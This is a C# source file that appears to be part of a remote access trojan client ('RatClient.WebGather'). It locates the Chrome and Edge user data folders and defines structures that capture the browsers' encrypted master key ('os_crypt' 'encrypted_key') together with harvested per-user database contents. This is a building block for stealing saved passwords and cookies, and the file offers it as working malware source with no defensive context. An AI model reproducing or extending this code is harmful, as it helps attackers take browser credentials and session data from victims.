using System;
using System.Collections.Generic;
using System.Runtime.Serialization;





namespace RatClient.WebGather
{
    public class WebInfo
    { 
        public static Dictionary<string, string> paths = new Dictionary<string, string>
        {
            { "chrome", $"{Info.UserInfo.UserHomePath}\\AppData\\Local\\Google\\Chrome\\User Data" },
            { "edge", $"{Info.UserInfo.UserHomePath}\\AppData\\Local\\Microsoft\\Edge\\User Data" }
        };
    }

    [DataContract]
    public class OsCrypt
    {
        [DataMember(Name = "encrypted_key")]
        public string EncryptedKey { get; set; }
    }

    [DataContract]
    public class Content
    {
        [DataMember(Name = "os_crypt")]
        public OsCrypt OsCrypt { get; set; }
    }

    [DataContract]
    public class UserDataBase
    {
        public UserDataBase(string user, string dataBase)
        {
            User = user;
            DataBase = dataBase;
        }

        [DataMember]
        public string User { get; set; }
        [DataMember]
        public string DataBase { get; set; }
    }

    [DataContract]
    public class FullResult 
    {
        public FullResult(string MasterKey, UserDataBase[] JsonResult)
        {
            masterKey = MasterKey;
            jsonResult = JsonResult;
        }
        [DataMember]
        public string masterKey { get; set; }
        [DataMember]
        public UserDataBase[] jsonResult { get; set; }
    }    
}
